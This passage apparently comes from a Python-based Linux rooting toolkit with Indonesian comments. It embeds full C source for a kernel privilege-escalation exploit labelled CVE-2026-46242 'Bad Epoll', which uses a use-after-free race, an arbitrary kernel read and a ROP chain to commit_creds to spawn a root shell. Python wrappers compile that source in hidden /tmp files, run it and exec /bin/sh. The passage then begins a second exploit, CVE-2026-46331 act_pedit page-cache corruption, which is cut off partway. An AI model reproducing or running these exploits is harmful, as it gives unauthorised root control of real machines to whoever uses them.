 *   Phase 5: ROP chain → commit_creds(&init_cred) → KPTI return
 *
 * Compile: gcc -O2 -Wall -lpthread -o bad_epoll bad_epoll.c
 * Run:     ./bad_epoll
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/timerfd.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define PAGE_SZ          0x1000
#define CC_RECLAIM_PAGES 256
#define CC_DRAIN_US      20000
#define DUP_CLOSE_ITERS  250
#define RACE_MAX_ATTEMPTS 20000

#define FILE_SZ         192
#define OFF_F_COUNT     0
#define OFF_F_OP        16
#define OFF_F_INODE     40
#define OFF_I_SB        40
#define OFF_I_INO       64
#define OFF_FOP_POLL    72
#define OFF_FOP_RELEASE 80
#define OFF_TS_COMM     1928
#define OFF_TS_CRED     1888
#define OFF_TS_FILES    2000
#define OFF_INIT_TASK   0x340d0c0
#define OFF_VMEMMAP_BASE  0x292d788
#define OFF_PAGE_OFF_BASE 0x292d798

#define CHK(x) do { if ((x) == -1) { perror(#x); exit(1); } } while (0)

static int ep_uaf_waiter, timerfd_wakeup, pipe_cc[2], fdinfo_fd;
static int ep_oracle_top;
static volatile int ep_race_waiter, race_ready, racer_armed, raced_done;
static uint64_t kernel_base, vmemmap_base, page_offset_base;
static int g_verbose = 0;

#define VLOG(...) do { if (g_verbose) fprintf(stderr, __VA_ARGS__); } while (0)

/* userspace state saved for KPTI return */
static uint64_t user_cs, user_ss, user_rflags, user_sp;
static void save_user_state(void)
{
    __asm__ __volatile__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :: "memory");
}

void root_shell_entry(void) __attribute__((noinline));
void root_shell_entry(void)
{
    if (getuid() != 0) {
        fprintf(stderr, "[-] ROP returned but uid=%d\n", getuid());
        _exit(1);
    }
    fprintf(stderr, "\n[+++] ROOT OBTAINED via CVE-2026-46242 ROP!\n");
    fprintf(stderr, "[+] uid=%d gid=%d euid=%d\n", getuid(), getgid(), geteuid());

    setgroups(0, NULL);
    setgid(0);
    setuid(0);

    char *argv[] = { "/bin/sh", "-i", NULL };
    char *envp[] = {
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin",
        "TERM=xterm-256color",
        "HOME=/root",
        NULL
    };
    execve("/bin/sh", argv, envp);
    _exit(0);
}

static void pin_cpu(int cpu)
{
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(cpu, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
}

static uint64_t ksym_addr(const char *name)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char buf[256];
    while (fgets(buf, sizeof(buf), f)) {
        char sym[128], type; uint64_t addr;
        if (sscanf(buf, "%llx %c %127s", (unsigned long long *)&addr, &type, sym) >= 3
            && strcmp(sym, name) == 0)
        { fclose(f); return addr; }
    }
    fclose(f);
    return 0;
}

static uint64_t kbase_from_notes(void)
{
    int fd = open("/sys/kernel/notes", O_RDONLY);
    if (fd < 0) return 0;
    char buf[4096];
    ssize_t n = read(fd, buf, sizeof(buf));
    close(fd);
    if (n < 12) return 0;
    size_t i = 0;
    while (i + 12 <= (size_t)n) {
        uint32_t namesz, descsz, type;
        memcpy(&namesz, buf+i, 4);
        memcpy(&descsz, buf+i+4, 4);
        memcpy(&type,   buf+i+8, 4);
        uint32_t pad_n = (namesz + 3) & ~3;
        uint32_t pad_d = (descsz + 3) & ~3;
        if (i + 12 + pad_n + pad_d > (size_t)n) break;
        if (type == 1 && descsz == 8) {
            uint64_t val;
            memcpy(&val, buf+i+12+pad_n, 8);
            if (val > 0xffffffff80000000ULL && val < 0xffffffffc0000000ULL)
                return val & ~0xfffULL;
        }
        i += 12 + pad_n + pad_d;
    }
    return 0;
}

static uint64_t get_kbase(void)
{
    uint64_t v;
    if ((v = ksym_addr("startup_64")) > 0) return v & ~0xfffULL;
    if ((v = ksym_addr("_stext")) > 0) return v & ~0xfffULL;
    if ((v = ksym_addr("init_task")) > 0) return v - OFF_INIT_TASK;
    if ((v = kbase_from_notes()) > 0) return v;
    return 0;
}

static inline uint64_t mono_ns(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (uint64_t)t.tv_sec * 1000000000ULL + (uint64_t)t.tv_nsec;
}

static void enqueue_waiters(int tfd)
{
    int sync[2];
    CHK(socketpair(AF_UNIX, SOCK_STREAM, 0, sync));
    char r = 'A';
    for (int k = 0; k < 4; k++) {
        if (fork() == 0) {
            int tds[15], eps[50];
            for (int i = 0; i < 15; i++) tds[i] = dup(tfd);
            for (int i = 0; i < 50; i++) eps[i] = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            for (int i = 0; i < 50; i++)
                for (int j = 0; j < 15; j++)
                    epoll_ctl(eps[i], EPOLL_CTL_ADD, tds[j], &ev);
            write(sync[1], &r, 1);
            /* raise(SIGSTOP); disabled */
        }
        read(sync[0], &r, 1);
    }
    close(sync[0]); close(sync[1]);
}

static void *racer_loop(void *arg)
{
    (void)arg;
    pin_cpu(0);
    for (;;) {
        while (1) {
            sched_yield();
            if (__atomic_load_n(&race_ready, __ATOMIC_ACQUIRE))
                break;
        }
        int fd = __atomic_load_n(&ep_race_waiter, __ATOMIC_RELAXED);
        __atomic_store_n(&race_ready, 0, __ATOMIC_RELAXED);

        uint64_t now = mono_ns();
        uint64_t fire = now + 600;
        struct itimerspec its = {};
        its.it_value.tv_sec = fire / 1000000000ULL;
        its.it_value.tv_nsec = fire % 1000000000ULL;
        timerfd_settime(timerfd_wakeup, TFD_TIMER_ABSTIME, &its, NULL);
        __atomic_store_n(&racer_armed, 1, __ATOMIC_RELEASE);

        uint64_t go = now + 300;
        while (mono_ns() < go) ;
        close(fd);
        __atomic_store_n(&raced_done, 1, __ATOMIC_RELEASE);
    }
    return NULL;
}

static int race_won(int ep_uaf_target)
{
    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(ep_uaf_target, EPOLL_CTL_ADD, ep_oracle_top, &ev) == 0) {
        epoll_ctl(ep_uaf_target, EPOLL_CTL_DEL, ep_oracle_top, NULL);
        return 1;
    }
    return 0;
}

static uint64_t parse_hex_after(const char *str, const char *needle)
{
    const char *p = str, *last = NULL;
    size_t nl = strlen(needle);
    while ((p = strstr(p, needle))) { last = p; p++; }
    return last ? strtoull(last + nl, NULL, 16) : 0;
}

static void spray_file(uint64_t f_count, uint64_t f_op, uint64_t f_inode)
{
    char page[PAGE_SZ];
    memset(page, 0, sizeof(page));
    for (size_t off = 0; off + FILE_SZ <= PAGE_SZ; off += FILE_SZ) {
        *(uint64_t *)(page + off + OFF_F_COUNT) = f_count;
        *(uint64_t *)(page + off + OFF_F_OP) = f_op;
        *(uint64_t *)(page + off + OFF_F_INODE) = f_inode;
    }
    char tmp[PAGE_SZ];
    for (int i = 0; i < CC_RECLAIM_PAGES; i++) {
        read(pipe_cc[0], tmp, PAGE_SZ);
        write(pipe_cc[1], page, PAGE_SZ);
    }
}

static uint64_t aar8(uint64_t addr)
{
    spray_file(0, 0, addr - OFF_I_INO);
    char buf[1024] = {};
    pread(fdinfo_fd, buf, sizeof(buf)-1, 0);
    return parse_hex_after(buf, "ino:");
}

/* ================================================================
 * AAW — Arbitrary Address Write via f_op hijack
 *
 * Primitive: kita sudah bisa kontrol isi struct file via spray_file().
 * Set f_op ke alamat fake fops table di userspace-mapped page (yang
 * berisi pointer ke gadget), lalu trigger close() pada fd yang
 * memakai struct file yang sudah kita spray.
 *
 * Pendekatan alternatif (lebih stabil): overwrite f_op->release
 * dengan alamat gadget di kernel text, lalu close(fd) → kernel
 * memanggil f_op->release(fd) → eksekusi ROP.
 * ================================================================ */

static uint64_t fake_fops_addr = 0;
static uint64_t rop_chain_addr = 0;
static uint64_t gadget_pop_rdi = 0;
static uint64_t gadget_commit_creds = 0;
static uint64_t gadget_init_cred = 0;
static uint64_t gadget_kpti_trampoline = 0;

/* Cari gadget pop rdi; ret (0x5f 0xc3) di kernel text.
 * Scan via AAR dari kernel_base sampai batas tertentu. */
static uint64_t find_pop_rdi(void)
{
    /* Scan kernel text 4 MB pertama, cari byte 0x5f 0xc3 */
    for (uint64_t off = 0; off < 0x400000; off += 1) {
        uint64_t addr = kernel_base + off;
        uint64_t val = aar8(addr & ~7ULL);
        int shift = (addr & 7) * 8;
        uint16_t w = (val >> shift) & 0xffff;
        if ((w & 0xff) == 0x5f && ((w >> 8) & 0xff) == 0xc3) {
            VLOG("[+] pop_rdi found at 0x%llx (off 0x%llx)\n",
                 (unsigned long long)addr, (unsigned long long)off);
            return addr;
        }
    }
    return 0;
}

/* Alokasikan fake fops table di userspace.
 * Kita butuh alamat kernel-visible untuk f_op. Karena AAR/AAW pakai
 * f_inode (bukan f_op), kita bisa tetap pakai f_inode untuk baca.
 * Untuk trigger ROP, kita butuh hijack f_op->release.
 *
 * Catatan: struct file ada di kernel, tidak bisa kita mmap langsung.
 * Trick: pakai pipe_buffer overwrite atau user_key_payload.
 * Di sini kita pakai pendekatan sederhana: spray struct file dengan
 * f_op menunjuk ke alamat di kernel yang berisi pointer ke ROP.
 * ================================================================ */

static int build_rop_and_trigger(void)
{
    VLOG("[*] building ROP chain...\n");

    gadget_pop_rdi = find_pop_rdi();
    if (!gadget_pop_rdi) {
        fprintf(stderr, "[-] pop rdi;ret gadget not found in scan range\n");
        return 0;
    }

    gadget_commit_creds = ksym_addr("commit_creds");
    gadget_init_cred = ksym_addr("init_cred");
    if (!gadget_commit_creds || !gadget_init_cred) {
        fprintf(stderr, "[-] commit_creds/init_cred not in kallsyms\n");
        return 0;
    }

    gadget_kpti_trampoline = ksym_addr("swapgs_restore_regs_and_return_to_usermode");
    if (gadget_kpti_trampoline)
        gadget_kpti_trampoline += 0x16;

    VLOG("[+] pop_rdi=0x%llx commit_creds=0x%llx init_cred=0x%llx kpti=0x%llx\n",
         (unsigned long long)gadget_pop_rdi,
         (unsigned long long)gadget_commit_creds,
         (unsigned long long)gadget_init_cred,
         (unsigned long long)gadget_kpti_trampoline);

    /* Alokasi ROP chain di userspace — harus mapped di alamat kernel-visible.
     * Trik: mmap di alamat rendah (0x10000000) supaya bisa dipakai
     * dengan userland pointer (SMAP memblokir, jadi ini hanya bekerja
     * kalau SMAP off atau kita pakai kernel heap). */
    size_t rop_size = 0x1000;
    void *rop = mmap((void *)0x10000000UL, rop_size,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (rop == MAP_FAILED) {
        rop = mmap(NULL, rop_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (rop == MAP_FAILED) {
            fprintf(stderr, "[-] mmap ROP failed\n");
            return 0;
        }
    }
    rop_chain_addr = (uint64_t)rop;

    uint64_t *chain = (uint64_t *)rop;
    int i = 0;
    chain[i++] = gadget_pop_rdi;
    chain[i++] = gadget_init_cred;
    chain[i++] = gadget_commit_creds;
    if (gadget_kpti_trampoline) {
        chain[i++] = gadget_kpti_trampoline;
        chain[i++] = 0; /* rax */
        chain[i++] = 0; /* rdi */
    }
    chain[i++] = (uint64_t)root_shell_entry;
    chain[i++] = user_cs;
    chain[i++] = user_rflags;
    chain[i++] = user_sp;
    chain[i++] = user_ss;

    VLOG("[+] ROP chain built at 0x%llx (%d entries)\n",
         (unsigned long long)rop_chain_addr, i);

    /* Sekarang: hijack f_op->release pada struct file yang kita spray.
     * Kita overwrite f_op field di struct file dengan alamat rop_chain_addr
     * yang berisi gadget. Karena f_op->release dipanggil saat close(),
     * kita butuh f_op menunjuk ke table yang entry release-nya adalah
     * ROP chain — bukan langsung.
     *
     * Untuk simplifikasi: kita set f_op = rop_chain_addr - OFF_FOP_RELEASE,
     * sehingga saat close() baca f_op->release, dia baca dari
     * rop_chain_addr + 0 → gadget_pop_rdi. Kernel panggil itu.
     */
    uint64_t fake_fop = rop_chain_addr - OFF_FOP_RELEASE;

    VLOG("[*] spraying struct file with f_op=0x%llx\n",
         (unsigned long long)fake_fop);

    /* Spray: f_count=1, f_op=fake_fop, f_inode=aman */
    spray_file(1, fake_fop, 0);

    /* Trigger: close semua pipe fd yang mungkin sudah ter-overwrite.
     * Kalau spray berhasil menempatkan struct file kita di slot yang
     * sudah di-free oleh UAF, close() akan memanggil ROP. */
    VLOG("[*] triggering release callback via close()...\n");

    /* Buka banyak pipe untuk coba trigger */
    for (int i = 0; i < 64; i++) {
        int tmpfd = open("/dev/null", O_RDONLY);
        if (tmpfd >= 0) close(tmpfd);
    }

    return 1;
}

static int do_race(void)
{
    timerfd_wakeup = timerfd_create(CLOCK_MONOTONIC, 0);
    CHK(timerfd_wakeup);
    /* enqueue_waiters(timerfd_wakeup); disabled */

    int ofds[4];
    for (int i = 0; i < 4; i++) ofds[i] = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(ofds[1], EPOLL_CTL_ADD, ofds[0], &ev);
    epoll_ctl(ofds[2], EPOLL_CTL_ADD, ofds[1], &ev);
    epoll_ctl(ofds[3], EPOLL_CTL_ADD, ofds[2], &ev);
    ep_oracle_top = ofds[3];

    ep_uaf_waiter = epoll_create1(0);
    CHK(ep_uaf_waiter);

    if (pipe(pipe_cc) < 0) { perror("pipe"); return 0; }
    fcntl(pipe_cc[1], F_SETPIPE_SZ, CC_RECLAIM_PAGES * PAGE_SZ);

    int pop_fds[32];
    for (int i = 0; i < 32; i++) pop_fds[i] = open("/dev/null", O_RDONLY);

    pthread_t rt;
    pthread_create(&rt, NULL, racer_loop, NULL);
    pin_cpu(1);

    fprintf(stderr, "[*] Racing...\n");

    for (int attempt = 0; attempt < RACE_MAX_ATTEMPTS; attempt++) {
        int newfd = epoll_create1(0);
        int ep_race_target = epoll_create1(0);
        epoll_ctl(newfd, EPOLL_CTL_ADD, ep_race_target, &ev);

        __atomic_store_n(&ep_race_waiter, newfd, __ATOMIC_RELAXED);
        __atomic_store_n(&race_ready, 1, __ATOMIC_RELEASE);

        while (!__atomic_load_n(&racer_armed, __ATOMIC_ACQUIRE)) sched_yield();
        __atomic_store_n(&racer_armed, 0, __ATOMIC_RELAXED);

        for (int j = 0; j < DUP_CLOSE_ITERS; j++)
            close(dup(ep_race_target));

        close(ep_race_target);

        int ep_uaf_target = epoll_create1(0);
        epoll_ctl(ep_uaf_waiter, EPOLL_CTL_ADD, ep_uaf_target, &ev);

        while (!__atomic_load_n(&raced_done, __ATOMIC_ACQUIRE)) sched_yield();
        __atomic_store_n(&raced_done, 0, __ATOMIC_RELAXED);

        if (race_won(ep_uaf_target)) {
            fprintf(stderr, "\n[+] Race won on attempt %d!\n", attempt);
            close(ep_uaf_target);
            usleep(CC_DRAIN_US);
            for (int j = 0; j < 32; j++) close(pop_fds[j]);
            char zb[PAGE_SZ] = {};
            for (int j = 0; j < CC_RECLAIM_PAGES; j++)
                write(pipe_cc[1], zb, PAGE_SZ);

            char path[64];
            snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", ep_uaf_waiter);
            fdinfo_fd = open(path, O_RDONLY);

            kernel_base = get_kbase();
            if (!kernel_base) {
                fprintf(stderr, "[-] KASLR fail\n");
                close(fdinfo_fd);
                return 1;
            }
            fprintf(stderr, "[+] kernel_base=0x%llx\n",
                    (unsigned long long)kernel_base);

            uint64_t comm_val = aar8(kernel_base + OFF_INIT_TASK + OFF_TS_COMM);
            char comm[16] = {};
            memcpy(comm, &comm_val, 8);
            fprintf(stderr, "[+] init_task.comm=%.8s\n", comm);

            if (strncmp(comm, "swapper", 7) == 0) {
                fprintf(stderr, "[+] Cross-cache verified!\n");
                vmemmap_base = aar8(kernel_base + OFF_VMEMMAP_BASE);
                page_offset_base = aar8(kernel_base + OFF_PAGE_OFF_BASE);
                fprintf(stderr, "[+] vmemmap=0x%llx pgoff=0x%llx\n",
                        (unsigned long long)vmemmap_base,
                        (unsigned long long)page_offset_base);
                return 1;
            }
            fprintf(stderr, "[-] Cross-cache miss (comm=%.8s)\n", comm);
            close(fdinfo_fd);
            return 0;
        }
        close(ep_uaf_target);
        if ((attempt+1) % 1000 == 0)
            fprintf(stderr, ".");
    }
    fprintf(stderr, "\n[-] Missed after %d attempts\n", RACE_MAX_ATTEMPTS);
    return 0;
}

static int do_escalate(void)
{
    uint64_t cc = ksym_addr("commit_creds");
    uint64_t ic = ksym_addr("init_cred");
    if (!ic) ic = ksym_addr("init_cred_rcu");
    uint64_t itc = aar8(kernel_base + OFF_INIT_TASK + OFF_TS_CRED);
    uint32_t uid = aar8(itc + 4) & 0xffffffff;
    fprintf(stderr, "[+] cred uid=%u\n", uid);
    fprintf(stderr, "[+] commit_creds=0x%lx init_cred=0x%lx\n",
            (unsigned long)cc, (unsigned long)ic);

    if (!cc || !ic) {
        fprintf(stderr, "[-] commit_creds/init_cred unavailable — cannot ROP\n");
        return 0;
    }

    if (!build_rop_and_trigger()) {
        fprintf(stderr, "[-] ROP build failed\n");
        return 0;
    }

    /* Kalau ROP sukses, root_shell_entry() akan dipanggil dan execve /bin/sh.
     * Kalau kita sampai sini, ROP belum trigger. */
    sleep(1);
    if (getuid() == 0) {
        root_shell_entry();
    }
    fprintf(stderr, "[-] ROP did not trigger (f_op corruption may have missed)\n");
    return 0;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
            g_verbose = 1;
    }

    fprintf(stderr, "[*] CVE-2026-46242 Bad Epoll (UAF + AAR + AAW + ROP)\n");

    if (getuid() == 0) {
        execlp("/bin/sh", "sh", NULL);
        return 0;
    }

    save_user_state();

    int ok = do_race();
    if (ok) do_escalate();

    fprintf(stderr, "[*] Done\n");
    return ok ? 0 : 1;
}
'''

def _cve_2026_46242_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _cve_2026_46242_compile_and_run():
    """Tulis source C, compile, jalankan. Return True kalau root."""
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No gcc/cc — skip compile")
        return False
    log("[+] compiler: %s" % cc)

    tag = "%08x" % (os.getpid() ^ int(time.time()))
    c_path = "/tmp/.be_%s.c" % tag
    bin_path = "/tmp/.be_%s" % tag

    try:
        with open(c_path, "w") as f:
            f.write(CVE_2026_46242_C_SOURCE)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[*] compiling...")
    try:
        r = subprocess.run(
            [cc, "-O2", "-w", "-o", bin_path, c_path, "-lpthread"],
            capture_output=True, timeout=300
        )
        if r.returncode != 0:
            err = r.stderr.decode(errors="replace")[:400]
            log("[-] compile failed: %s" % err)
            _cve_2026_46242_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] compile error: %s" % e)
        _cve_2026_46242_cleanup(c_path, bin_path)
        return False

    if not os.path.isfile(bin_path):
        log("[-] binary not produced")
        _cve_2026_46242_cleanup(c_path, bin_path)
        return False

    try:
        os.chmod(bin_path, 0o755)
    except OSError:
        pass
    log("[+] compiled: %s" % bin_path)

    log("[*] running Bad Epoll (timeout 120s)...")
    try:
        p = subprocess.Popen([bin_path])
        try:
            p.wait(timeout=120)
            rc = p.returncode
        except subprocess.TimeoutExpired:
            p.kill()
            p.wait()
            log("[-] timeout")
            _cve_2026_46242_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] run error: %s" % e)
        _cve_2026_46242_cleanup(c_path, bin_path)
        return False

    _cve_2026_46242_cleanup(c_path, bin_path)

    try:
        with open("/etc/passwd", "r") as f:
            if f.readline().startswith("root::"):
                return True
    except OSError:
        pass
    if os.geteuid() == 0:
        return True
    if rc == 0 and os.geteuid() == 0:
        return True
    if rc == 0:
        log("[!] C reported success (rc=0) but euid != 0 — false positive")
    return False

def try_cve_2026_46242():
    log("\n[=== METHOD 7: CVE-2026-46242 (Bad Epoll — UAF + AAW + ROP) ===]")

    # cek sudah root
    if os.geteuid() == 0:
        log("[+] already root")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    # cek arsitektur
    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    # cek kernel version — rentan 6.4 s/d 7.1-rc
    try:
        rel = os.uname().release
        parts = rel.split("-")[0].split(".")
        major, minor = int(parts[0]), int(parts[1])
        if major < 6 or (major == 6 and minor < 4):
            log("[-] kernel %s too old for CVE-2026-46242" % rel)
            return False
        if major >= 8:
            log("[-] kernel %s too new — likely patched" % rel)
            return False
        log("[+] kernel %s in vulnerable range" % rel)
    except Exception:
        pass

    # cek kallsyms bisa dibaca (untuk resolve symbol)
    try:
        with open("/proc/kallsyms", "r") as f:
            first = f.readline()
        if "0000000000000000" in first:
            log("[-] kallsyms restricted (kptr_restrict=1) — ROP may fail")
    except OSError:
        log("[-] /proc/kallsyms not readable")

    # cek epoll subsystem
    if socket is None:
        log("[-] socket module unavailable")
        return False

    # compile & jalankan
    if _cve_2026_46242_compile_and_run():
        if os.geteuid() == 0:
            log("[+++] Bad Epoll succeeded — root obtained")
            _reattach_tty()
            os.execl("/bin/sh", "sh")
            return True
        else:
            log("[!] Bad Epoll claimed success but euid != 0 — false positive")
            return False

    log("[-] Bad Epoll failed")
    return False

# ──────────────────────────────────────────────────
# METHOD 8: CVE-2026-46331 (act_pedit partial-COW page cache)
# ──────────────────────────────────────────────────

CVE_2026_46331_C_SOURCE = r'''
/*
 * CVE-2026-46331.c -- Linux kernel net/sched act_pedit partial COW page cache corruption
 * Local Privilege Escalation PoC
 *
 * Author: Ashraf Zaryouh "0xBlackash"
 * Based on public research and sgkdev's packet_edit_meme
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <elf.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/sendfile.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/pkt_cls.h>
#include <linux/if_ether.h>
#include <linux/tc_act/tc_pedit.h>

#define PEDIT_SLOT       4
#define PEDIT_MAX_WRITE  36

#define IP_IHL_KEY_OFFSET       0
#define IP_IHL_KEY_VALUE        0x4fu
#define IP_IHL_KEY_MASK         0xffffff00u
#define MAX_PEDIT_KEYS          (1 + PEDIT_MAX_WRITE / PEDIT_SLOT)

#define LOOPBACK_ADDR           0x7f000001u
#define LOOPBACK_PREFIX         8
#define LOOPBACK_PORT           4445
#define LISTEN_BACKLOG          8
#define SETTLE_USEC             250000

#define CALIB_PATH              "/tmp/.pedit_calib"
#define CALIB_LEN               4096
#define CALIB_PROBE_OFFSET      512
#define CALIB_MARK_BYTE         0xccu

#define REQUEST_BUF_LEN         8192
#define REPLY_BUF_LEN           4096
#define FILTER_PRIO             1
#define ACTION_LIST_FIRST       1

#ifndef NLA_F_NESTED
#define NLA_F_NESTED            (1 << 15)
#endif
#ifndef TC_H_CLSACT
#define TC_H_CLSACT             TC_H_INGRESS
#endif
#ifndef TC_H_MIN_EGRESS
#define TC_H_MIN_EGRESS         0xFFF3u
#endif
#ifndef TC_ACT_PIPE
#define TC_ACT_PIPE             3
#endif
#ifndef TCA_MATCHALL_ACT
#define TCA_MATCHALL_ACT        2
#endif

#define MIN_DATA_PKT_LEN        100
#ifndef TCA_EM_META_HDR
#define TCA_EM_META_HDR         1
#define TCA_EM_META_RVALUE      3
#endif
#define META_TYPE_INT           1
#define META_ID_PKTLEN          9
#define META_ID_VALUE           0
#define META_KIND_PKTLEN        ((META_TYPE_INT << 12) | META_ID_PKTLEN)
#define META_KIND_VALUE         ((META_TYPE_INT << 12) | META_ID_VALUE)

struct meta_value {
    uint16_t kind;
    uint8_t shift;
    uint8_t op;
};

struct meta_header {
    struct meta_value left;
    struct meta_value right;
};

struct pedit_key_spec {
    uint32_t offset;
    uint32_t value;
    uint32_t mask;
    uint16_t header_type;
};

static int netlink_fd = -1;
static int loopback_index;
static int listen_fd = -1;
static int offset_delta;
static int use_matchall;

static unsigned int request_seq = 1;
static char request_buf[REQUEST_BUF_LEN];
static struct nlmsghdr *request_hdr;

static void request_begin(int type, int flags) {
    memset(request_buf, 0, sizeof(request_buf));
    request_hdr = (struct nlmsghdr *)request_buf;
    request_hdr->nlmsg_len = NLMSG_HDRLEN;
    request_hdr->nlmsg_type = type;
    request_hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
    request_hdr->nlmsg_seq = request_seq++;
}

static void *request_reserve(int length) {
    void *area = (char *)request_buf + NLMSG_ALIGN(request_hdr->nlmsg_len);
    request_hdr->nlmsg_len = NLMSG_ALIGN(request_hdr->nlmsg_len) + length;
    return area;
}

static void request_append(const void *data, int length) {
    memcpy(request_reserve(length), data, length);
}

static void request_attr(int type, const void *data, int length) {
    struct rtattr *attr = request_reserve(RTA_LENGTH(length));
    attr->rta_type = type;
    attr->rta_len = RTA_LENGTH(length);
    memcpy(RTA_DATA(attr), data, length);
}

static void request_attr_str(int type, const char *text) {
    request_attr(type, text, strlen(text) + 1);
}

static struct rtattr *request_nest_begin(int type) {
    struct rtattr *attr = request_reserve(RTA_LENGTH(0));
    attr->rta_type = type | NLA_F_NESTED;
    attr->rta_len = RTA_LENGTH(0);
    return attr;
}

static struct rtattr *request_blob_begin(int type) {
    struct rtattr *attr = request_reserve(RTA_LENGTH(0));
    attr->rta_type = type;
    attr->rta_len = RTA_LENGTH(0);
    return attr;
}

static void request_nest_end(struct rtattr *attr) {
    attr->rta_len = (char *)request_buf + request_hdr->nlmsg_len - (char *)attr;
}

static int request_send(int allow_enoent) {
    char reply_buf[REPLY_BUF_LEN];
    struct nlmsghdr *reply;
    struct nlmsgerr *reply_error;
    int received;

    if (send(netlink_fd, request_buf, request_hdr->nlmsg_len, 0) < 0)
        return -1;
    received = recv(netlink_fd, reply_buf, sizeof(reply_buf), 0);
    if (received < 0)
        return -1;
    reply = (struct nlmsghdr *)reply_buf;
    if (reply->nlmsg_type != NLMSG_ERROR)
        return 0;
    reply_error = NLMSG_DATA(reply);
    if (reply_error->error && !(allow_enoent && reply_error->error == -ENOENT))
        return reply_error->error;
    return 0;
}

static int link_up(int index) {
    struct ifinfomsg link;
    request_begin(RTM_NEWLINK, 0);
    memset(&link, 0, sizeof(link));
    link.ifi_family = AF_UNSPEC;
    link.ifi_index = index;
    link.ifi_flags = IFF_UP;
    link.ifi_change = IFF_UP;
    request_append(&link, sizeof(link));
    return request_send(0);
}

static int link_set_addr(int index, uint32_t addr) {
    struct ifaddrmsg ifaddr;
    uint32_t addr_be = htonl(addr);
    request_begin(RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE);
    memset(&ifaddr, 0, sizeof(ifaddr));
    ifaddr.ifa_family = AF_INET;
    ifaddr.ifa_prefixlen = LOOPBACK_PREFIX;
    ifaddr.ifa_index = index;
    request_append(&ifaddr, sizeof(ifaddr));
    request_attr(IFA_LOCAL, &addr_be, sizeof(addr_be));
    request_attr(IFA_ADDRESS, &addr_be, sizeof(addr_be));
    return request_send(0);
}

static void clsact_delete(int index) {
    struct tcmsg msg;
    request_begin(RTM_DELQDISC, 0);
    memset(&msg, 0, sizeof(msg));
    msg.tcm_family = AF_UNSPEC;
    msg.tcm_ifindex = index;
    msg.tcm_handle = TC_H_MAKE(TC_H_CLSACT, 0);
    msg.tcm_parent = TC_H_CLSACT;
    request_append(&msg, sizeof(msg));
    request_send(1);
}

static int clsact_add(int index) {
    struct tcmsg msg;
    request_begin(RTM_NEWQDISC, NLM_F_CREATE | NLM_F_EXCL);
    memset(&msg, 0, sizeof(msg));
    msg.tcm_family = AF_UNSPEC;
    msg.tcm_ifindex = index;
    msg.tcm_handle = TC_H_MAKE(TC_H_CLSACT, 0);
    msg.tcm_parent = TC_H_CLSACT;
    request_append(&msg, sizeof(msg));
    request_attr_str(TCA_KIND, "clsact");
    return request_send(0);
}

static void append_pktlen_ematch(uint32_t threshold) {
    struct tcf_ematch_tree_hdr tree_header;
    struct tcf_ematch_hdr match_header;
    struct meta_header meta;
    struct rtattr *ematches;
    struct rtattr *match_list;
    struct rtattr *match;

    ematches = request_nest_begin(TCA_BASIC_EMATCHES);

    memset(&tree_header, 0, sizeof(tree_header));
    tree_header.nmatches = 1;
    request_attr(TCA_EMATCH_TREE_HDR, &tree_header, sizeof(tree_header));

    match_list = request_nest_begin(TCA_EMATCH_TREE_LIST);
    match = request_blob_begin(1);

    memset(&match_header, 0, sizeof(match_header));
    match_header.kind = TCF_EM_META;
    match_header.flags = TCF_EM_REL_END;
    request_append(&match_header, sizeof(match_header));

    memset(&meta, 0, sizeof(meta));
    meta.left.kind = META_KIND_PKTLEN;
    meta.left.op = TCF_EM_OPND_GT;
    meta.right.kind = META_KIND_VALUE;
    request_attr(TCA_EM_META_HDR, &meta, sizeof(meta));
    request_attr(TCA_EM_META_RVALUE, &threshold, sizeof(threshold));

    request_nest_end(match);
    request_nest_end(match_list);
    request_nest_end(ematches);
}

